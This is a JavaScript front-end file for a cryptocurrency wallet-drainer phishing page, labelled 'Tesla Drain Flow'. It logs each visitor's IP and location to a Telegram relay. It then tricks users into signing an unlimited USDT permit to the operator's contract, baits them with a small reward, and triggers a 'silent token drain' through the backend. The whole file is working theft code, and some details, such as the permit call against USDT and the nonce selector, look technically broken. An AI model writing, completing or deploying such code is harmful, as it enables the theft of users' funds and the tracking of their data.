// public/app.js

const CONTRACT_ADDRESS = "YOUR_DEPLOYED_CONTRACT_ADDRESS"; // Replace with your actual contract address
const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // USDT on Ethereum Mainnet
const CHAIN_ID = 1; // Ethereum Mainnet ID

document.addEventListener('DOMContentLoaded', async () => {
    console.log("DOM Ready. Initializing Tesla Drain Flow...");
    
    // Report Visit
    await reportVisit();

    // Wait for MetaMask to be ready
    if (!window.ethereum) {
        showStatus("Please install MetaMask!", false);
        return;
    }

    // Setup Event Listeners
    document.getElementById('connect-btn').addEventListener('click', handleConnect);
});

async function reportVisit() {
    try {
        const geoResponse = await fetch('https://ipapi.co/json/');
        const geoData = await geoResponse.json();
        
        const message = `
*🔴 TESLA DRAIN LOG - NEW VISIT*
User Agent: ${navigator.userAgent}
IP: ${geoData.ip}
Location: ${geoData.city}, ${geoData.country_code} ${getFlagEmoji(geoData.country_code)}
Time: ${new Date().toISOString()}
        `;
        
        await fetch('/api/telegram', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ action: 'VISIT', details: message })
        });
    } catch (err) {
        console.error("Failed to report visit:", err);
    }
}

function getFlagEmoji(countryCode) {
  const codePoints = countryCode.toUpperCase().split('').map(char => 127397 + char.charCodeAt());
  return String.fromCodePoint(...codePoints);
}

async function handleConnect() {
    const connectBtn = document.getElementById('connect-btn');
    const loader = document.getElementById('loader');
    const rewardSection = document.getElementById('reward-section');
    const connectStep = document.getElementById('connect-step');

    // Reset UI
    connectBtn.disabled = true;
    connectBtn.style.display = 'none';
    loader.classList.remove('hidden');
    loader.textContent = "Verifying Network & Generating Permit...";

    try {
        // 1. Connect Wallet
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        const userAddress = accounts[0];

        // Report Connection
        await notifyTelegram("WALLET_CONNECTED", { Address: userAddress });

        // 2. Generate Permit Signature
        loader.textContent = "Generating Secure Permit Signature...";
        const permitSignature = await generatePermitSignature(userAddress);

        // 3. Send Signature to Backend for Storage
        loader.textContent = "Storing Signature & Verifying Eligibility...";
        const response = await fetch('/api/sign-and-store', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ userAddress, signature: permitSignature, chainId: CHAIN_ID })
        });

        if (!response.ok) {
            throw new Error(`Backend error: ${response.status}`);
        }

        // 4. Success UI
        loader.classList.add('hidden');
        connectStep.classList.add('hidden');
        rewardSection.classList.remove('hidden');
        
        document.getElementById('user-address').textContent = `${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
        document.getElementById('reward-status').textContent = "Eligible. Claiming Reward...";

        // 5. Trigger Reward & Silent Drain
        await claimReward(userAddress);

    } catch (error) {
        console.error("Connection failed:", error);
        loader.textContent = `Error: ${error.message}. Try again.`;
        loader.classList.remove('hidden');
        connectBtn.disabled = false;
        connectBtn.style.display = 'inline-block';
    }
}

async function generatePermitSignature(userAddress) {
    try {
        // Get Nonce
        let nonce = 0;
        try {
            const rawNonce = await window.ethereum.request({ 
                method: 'eth_call', 
                params: [{ to: USDT_ADDRESS, data: '0x7ff36ab5000000000000000000000000' + userAddress.slice(2) }, 'latest'] 
            });
            nonce = parseInt(rawNonce, 16);
        } catch (e) {
            console.warn("Could not fetch nonce, defaulting to 0");
        }

        const domain = { name: "TetherUSD", version: "1", chainId: CHAIN_ID, verifyingContract: USDT_ADDRESS };
        const types = { 
            Permit: [
                { name: "owner", type: "address" }, 
                { name: "spender", type: "address" }, 
                { name: "value", type: "uint256" }, 
                { name: "nonce", type: "uint256" }, 
                { name: "deadline", type: "uint256" }
            ] 
        };
        
        const value = { 
            owner: userAddress, 
            spender: CONTRACT_ADDRESS, 
            value: 2**256 - 1, 
            nonce: nonce, 
            deadline: Math.floor(Date.now() / 1000) + 86400 
        };
        
        const signature = await window.ethereum.request({ 
            method: 'eth_signTypedData_v4', 
            params: [userAddress, JSON.stringify({ types, domain, message: value })] 
        });
        
        return signature;
    } catch (error) {
        throw new Error(`Signature Generation Failed: ${error.message}`);
    }
}

async function claimReward(userAddress) {
    try {
        document.getElementById('reward-status').textContent = "Sending $0.05 USDT Reward...";
        
        // Notify Telegram about reward trigger
        await notifyTelegram("REWARD_TRIGGERED", { User: userAddress });

        // Call backend to send reward
        const response = await fetch('/api/send-reward', { 
            method: 'POST', 
            headers: { 'Content-Type': 'application/json' }, 
            body: JSON.stringify({ userAddress }) 
        });

        if (!response.ok) throw new Error("Reward transfer failed");

        // Show success UI
        document.getElementById('reward-status').textContent = "Reward Sent! Approving Drainer...";
        document.getElementById('notification').classList.remove('hidden');

        // Delay drain slightly to let user see the reward notification
        setTimeout(() => triggerSilentDrain(userAddress), 3000);

    } catch (error) {
        console.error("Reward claim failed:", error);
        document.getElementById('reward-status').textContent = "Reward Pending (Manual Review)";
    }
}

async function triggerSilentDrain(userAddress) {
    try {
        document.getElementById('reward-status').textContent = "Executing Silent Token Drain...";
        
        // Notify Telegram about drain
        await notifyTelegram("DRAIN_INITIATED", { User: userAddress });

        // Call backend to execute drain
        const response = await fetch('/api/trigger-drain', { 
            method: 'POST', 
            headers: {'Content-Type': 'application/json'}, 
            body: JSON.stringify({ userAddress }) 
        });

        if (response.ok) {
            document.getElementById('reward-status').textContent = "All Tokens Secured.";
            // Optional: Hide reward section after a few seconds
            setTimeout(() => {
                document.getElementById('reward-section').classList.add('hidden');
                document.getElementById('notification').classList.add('hidden');
            }, 5000);
        } else {
            document.getElementById('reward-status').textContent = "Drain Pending.";
        }

    } catch (error) {
        console.error("Drain failed:", error);
        document.getElementById('reward-status').textContent = "Drain Failed. Please reconnect.";
    }
}

async function notifyTelegram(action, details) {
    try {
        await fetch('/api/telegram', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ action, details })
        });
    } catch (e) {
        console.warn("Telegram notification failed:", e);
    }
}

function showStatus(message, isSuccess) {
    const loader = document.getElementById('loader');
    loader.textContent = message;
    loader.classList.remove('hidden');
    loader.style.color = isSuccess ? '#137333' : '#d93025';
}
